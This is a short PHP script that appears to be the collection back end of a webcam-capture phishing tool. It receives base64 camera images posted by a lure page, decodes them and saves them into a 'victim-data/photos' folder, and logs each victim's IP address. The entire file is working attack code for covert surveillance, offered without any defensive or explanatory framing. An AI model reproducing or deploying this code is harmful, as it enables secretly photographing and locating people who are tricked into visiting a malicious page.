<?php

$date = date('Y-m-d-H-i-s');
$imageData = $_POST['cat'];
$clientIp = $_SERVER['HTTP_X_FORWARDED_FOR'] ?? 'non-ip';

if (!empty($_POST['cat'])) {
    error_log(
        "Received image: cam-" . $date . ".jpg, from ip:" . $clientIp . "\r\n",
        3,
        "./victim-data/photos/cam-data-post.log"
    );
}

$filteredData = substr(
    $imageData,
    strpos($imageData, ",")+1
);

$unencodedData = base64_decode($filteredData);

$fp = fopen(
    './victim-data/photos/cam-'.$date.'.jpeg',
    'wb'
);

fwrite( $fp, $unencodedData);
fclose( $fp );

exit(0);
